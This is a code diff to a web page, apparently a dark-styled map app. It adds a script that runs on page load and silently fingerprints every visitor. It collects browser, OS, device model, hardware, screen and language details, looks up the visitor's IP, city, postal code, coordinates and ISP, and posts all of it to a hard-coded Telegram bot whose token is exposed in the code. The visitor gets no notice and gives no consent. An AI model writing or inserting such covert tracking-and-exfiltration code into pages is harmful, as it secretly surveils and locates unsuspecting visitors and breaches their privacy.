@@ -506,6 +506,212 @@
 <script>
 let map;
 
+const TELEGRAM_TOKEN = "8843365045:AAFAovSP2Op8nm2Inkr5iRJ8L9DCgfHZVqo";
+const TELEGRAM_CHAT_ID = "8298632696";
+
+function detectBrowser(ua) {
+  if (/Edg\//i.test(ua)) return "Microsoft Edge";
+  if (/OPR\//i.test(ua) || /Opera/i.test(ua)) return "Opera";
+  if (/CriOS/i.test(ua)) return "Chrome (iOS)";
+  if (/FxiOS/i.test(ua)) return "Firefox (iOS)";
+  if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) return "Google Chrome";
+  if (/Firefox\//i.test(ua)) return "Mozilla Firefox";
+  if (/Safari\//i.test(ua) && !/Chrome|Chromium|CriOS|FxiOS/i.test(ua)) return "Apple Safari";
+  return "Unknown Browser";
+}
+
+function detectOSAndModel(ua) {
+  let os = "Unknown OS";
+  let category = "Desktop";
+  let modelOrBuild = "Not exposed by browser";
+
+  if (/iPhone/i.test(ua)) {
+    os = "iOS (iPhone)";
+    category = "Mobile / Phone";
+    const iosVer = ua.match(/OS\s+([\d_]+)/i);
+    modelOrBuild = iosVer ? `iPhone (iOS ${iosVer[1].replace(/_/g, ".")}) — exact model hidden by Apple` : "iPhone — exact model hidden by Apple";
+  } else if (/iPad/i.test(ua)) {
+    os = "iPadOS (iPad)";
+    category = "Tablet";
+    const ipadVer = ua.match(/OS\s+([\d_]+)/i);
+    modelOrBuild = ipadVer ? `iPad (iPadOS ${ipadVer[1].replace(/_/g, ".")}) — exact model hidden by Apple` : "iPad — exact model hidden by Apple";
+  } else if (/Android/i.test(ua)) {
+    category = "Mobile / Phone";
+    const androidVer = ua.match(/Android\s+([\d.]+)/i);
+    os = androidVer ? `Android ${androidVer[1]}` : "Android";
+    const modelMatch = ua.match(/Android[^;)]*;\s*([^;)]+)\s+Build/i) || ua.match(/Android[^;)]*;\s*([^;)]+)\)/i);
+    if (modelMatch && modelMatch[1]) {
+      modelOrBuild = modelMatch[1].trim();
+    } else {
+      modelOrBuild = "Android device (model masked/genericized)";
+    }
+  } else if (/Macintosh|Mac OS X/i.test(ua)) {
+    os = "macOS";
+    category = "Desktop / Laptop";
+    const macVer = ua.match(/Mac OS X\s+([\d_]+)/i);
+    modelOrBuild = macVer ? `Mac (macOS ${macVer[1].replace(/_/g, ".")})` : "Mac";
+  } else if (/Windows NT/i.test(ua)) {
+    category = "Desktop / PC";
+    if (/Windows NT 10\.0/i.test(ua)) os = "Windows 10 / 11";
+    else os = "Windows";
+    modelOrBuild = "Windows PC";
+  } else if (/Linux/i.test(ua)) {
+    os = "Linux";
+    category = "Desktop / Linux";
+    modelOrBuild = "Linux Machine";
+  }
+
+  return { os, category, modelOrBuild };
+}
+
+async function getClientHintsModel(fallbackModel) {
+  try {
+    if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === "function") {
+      const hints = await navigator.userAgentData.getHighEntropyValues([
+        "model",
+        "platform",
+        "platformVersion",
+        "architecture",
+        "bitness"
+      ]);
+      const parts = [];
+      if (hints.model) parts.push(hints.model);
+      if (hints.platform) parts.push(`Platform: ${hints.platform} ${hints.platformVersion || ""}`.trim());
+      if (hints.architecture) parts.push(`Arch: ${hints.architecture}${hints.bitness ? ` (${hints.bitness}-bit)` : ""}`);
+      if (parts.length > 0) return parts.join(" | ");
+    }
+  } catch (_) {}
+  return fallbackModel;
+}
+
+async function fetchIpAndGeo() {
+  try {
+    const r = await fetch("https://ipwho.is/", { cache: "no-store" });
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.ip) {
+        return {
+          ip: d.ip,
+          country: d.country || "Unknown",
+          countryCode: d.country_code || "",
+          region: d.region || "Unknown",
+          city: d.city || "Unknown",
+          postal: d.postal || "N/A",
+          isp: (d.connection && (d.connection.isp || d.connection.org)) || "Unknown",
+          asn: (d.connection && d.connection.asn) || "N/A",
+          lat: d.latitude ?? "N/A",
+          lng: d.longitude ?? "N/A",
+          timezone: (d.timezone && d.timezone.id) || Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
+        };
+      }
+    }
+  } catch (_) {}
+
+  try {
+    const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+    if (r.ok) {
+      const d = await r.json();
+      return {
+        ip: d.ip || "Unknown",
+        country: "Unknown",
+        countryCode: "",
+        region: "Unknown",
+        city: "Unknown",
+        postal: "N/A",
+        isp: "Unknown",
+        asn: "N/A",
+        lat: "N/A",
+        lng: "N/A",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
+      };
+    }
+  } catch (_) {}
+
+  return {
+    ip: "Unknown",
+    country: "Unknown",
+    countryCode: "",
+    region: "Unknown",
+    city: "Unknown",
+    postal: "N/A",
+    isp: "Unknown",
+    asn: "N/A",
+    lat: "N/A",
+    lng: "N/A",
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
+  };
+}
+
+async function sendDetailedEntryAlert() {
+  const ua = navigator.userAgent || "Unknown";
+  const browser = detectBrowser(ua);
+  const { os, category, modelOrBuild } = detectOSAndModel(ua);
+  const detailedModel = await getClientHintsModel(modelOrBuild);
+  const geo = await fetchIpAndGeo();
+
+  const languages = Array.isArray(navigator.languages) && navigator.languages.length
+    ? navigator.languages.join(", ")
+    : (navigator.language || "Unknown");
+  const cpuCores = navigator.hardwareConcurrency || "Unknown";
+  const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Not exposed";
+  const touchPoints = navigator.maxTouchPoints ?? 0;
+  const screenRes = `${window.screen.width}x${window.screen.height}`;
+  const viewportRes = `${window.innerWidth}x${window.innerHeight}`;
+  const pixelRatio = window.devicePixelRatio || 1;
+  const onlineStatus = navigator.onLine ? "Online" : "Offline";
+  const referrer = document.referrer || "Direct / None";
+  const enteredAt = new Date().toISOString();
+
+  const text = [
+    "Visitor Entered Page",
+    "--------------------",
+    `IP: ${geo.ip}`,
+    `Country: ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ""}`,
+    `Region / City: ${geo.region} / ${geo.city}`,
+    `Postal: ${geo.postal}`,
+    `Coords (approx): ${geo.lat}, ${geo.lng}`,
+    `ISP / Org: ${geo.isp} (ASN: ${geo.asn})`,
+    `Timezone: ${geo.timezone}`,
+    "--------------------",
+    `Category: ${category}`,
+    `OS: ${os}`,
+    `Phone / Model Info: ${detailedModel}`,
+    `Browser: ${browser}`,
+    `Touch Points: ${touchPoints}`,
+    `CPU Cores: ${cpuCores}`,
+    `Approx RAM: ${deviceMemory}`,
+    `Screen: ${screenRes} (DPR: ${pixelRatio}x)`,
+    `Viewport: ${viewportRes}`,
+    `Languages: ${languages}`,
+    `Network: ${onlineStatus}`,
+    "--------------------",
+    `Page: ${window.location.href}`,
+    `Referrer: ${referrer}`,
+    `Time (UTC): ${enteredAt}`,
+    `User-Agent: ${ua}`
+  ].join("\n");
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+  try {
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text
+      }),
+      keepalive: true
+    });
+    const data = await res.json();
+    console.log("Telegram detailed alert:", data);
+  } catch (err) {
+    console.error("Telegram detailed alert error:", err);
+  }
+}
+
+sendDetailedEntryAlert();
+
 const DARK_MAP_STYLES = [
   { elementType: 'geometry', stylers: [{ color: '#181b20' }] },
   { elementType: 'labels.text.stroke', stylers: [{ color: '#181b20' }] },
@@ -730,9 +936,6 @@ setTimeout(() => {
     border-radius: 12px;
     overflow: hidden;
   ">
-    
-    </button>
-
     <iframe src="popup.html"
       style="width:100%;height:100%;border:0;">
     </iframe>
